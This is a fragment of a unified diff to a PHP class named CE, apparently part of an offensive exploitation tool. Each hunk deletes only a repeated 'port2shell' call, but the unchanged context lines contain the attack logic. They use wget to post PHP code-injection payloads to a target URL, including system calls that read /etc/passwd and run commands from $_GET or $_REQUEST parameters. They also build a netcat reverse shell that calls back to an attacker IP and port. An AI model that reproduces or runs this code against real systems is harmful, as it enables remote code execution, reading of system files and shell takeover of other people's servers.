@@ -249,7 +249,7 @@ class CE extends PARAM4COM{
         $url = $this->param2url($template, $cmd);
         $query = "wget --no-check-certificate -qO- --post-data \"<?system('cat /etc/passwd')?>\" \"$url\" $filter ";
         if (!empty($this->req_ret_str($query))) {
-            $this->port2shell(base64_encode($template));
+            
             $rev = $this->rev8nc($attacker_ip, $attacker_port, $shell);
             $cmd_rev_nc = "wget --no-check-certificate -qO- --post-data \"<?system('$rev')?>\" \"$url\" 2> /dev/null ";
             $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
@@ -264,7 +264,7 @@ class CE extends PARAM4COM{
         $url = $this->param2url($template, $cmd);
         $query = "wget --no-check-certificate -qO- --post-data \"<?system('cat /etc/passwd')?>\" \"$url\" $filter ";
         if (!empty($this->req_ret_str($query))) {
-            $this->port2shell(base64_encode($template));
+            
             $rev = $this->rev8nc($attacker_ip, $attacker_port, $shell);
             $cmd_rev_nc = "wget --no-check-certificate -qO- --post-data \"<?system('$rev')?>\" \"$url\" 2> /dev/null ";
             $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
@@ -280,7 +280,7 @@ class CE extends PARAM4COM{
         $url = $this->param2url($template, $cmd_exec);
         $query = "wget --no-check-certificate -qO- --post-data \"<?system(\\\$_GET[cmd])?>\" \"$url\" $filter ";
         if (!empty($this->req_ret_str($query))) {
-            $this->port2shell(base64_encode($template));
+            
             $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
         }
         
@@ -291,7 +291,7 @@ class CE extends PARAM4COM{
         $url = $this->param2url($template, $cmd_exec);
         $query = "wget --no-check-certificate -qO- --post-data \"<?system(\\\$_GET['cmd'])?>\" \"$url\" $filter ";
         if (!empty($this->req_ret_str($query))) {
-            $this->port2shell(base64_encode($template));
+            
             $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
         }
         
@@ -301,7 +301,7 @@ class CE extends PARAM4COM{
         $url = $this->param2url($template, $cmd_exec);
         $query = "wget --no-check-certificate -qO- --post-data \"<?system(\$_GET[cmd])?>\" \"$url\" $filter ";
         if (!empty($this->req_ret_str($query))) {
-            $this->port2shell(base64_encode($template));
+            
             $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
         }
         
@@ -312,7 +312,7 @@ class CE extends PARAM4COM{
         $url = $this->param2url($template, $cmd_exec);
         $query = "wget --no-check-certificate -qO- --post-data \"<?system(\$_GET[cmd])?>\" \"$url\" $filter ";
         if (!empty($this->req_ret_str($query))) {
-            $this->port2shell(base64_encode($template));
+            
             $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
         }
         
@@ -322,7 +322,7 @@ class CE extends PARAM4COM{
         $url = $this->param2url($template, $cmd_exec);
         $query = "wget --no-check-certificate -qO- --post-data \"<?system(\$_GET['cmd'])?>\" \"$url\" $filter ";
         if (!empty($this->req_ret_str($query))) {
-            $this->port2shell(base64_encode($template));
+            
             $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
         }
         
@@ -333,7 +333,7 @@ class CE extends PARAM4COM{
         $url = $this->param2url($template, $cmd_exec);
         $query = "wget --no-check-certificate -qO- --post-data \"<?system(\$_REQUEST[cmd])?>\" \"$url\" $filter ";
         if (!empty($this->req_ret_str($query))) {
-            $this->port2shell(base64_encode($template));
+            
             $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
         }
         
@@ -344,7 +344,7 @@ class CE extends PARAM4COM{
         $url = $this->param2url($template, $cmd_exec);
         $query = "wget --no-check-certificate -qO- --post-data \"<?system(\$_REQUEST[cmd])?>\" \"$url\" $filter ";
         if (!empty($this->req_ret_str($query))) {
-            $this->port2shell(base64_encode($template));
+            
             $this->service4lan($template, $cmd_rev_nc, $attacker_port, $filter);
         }
         
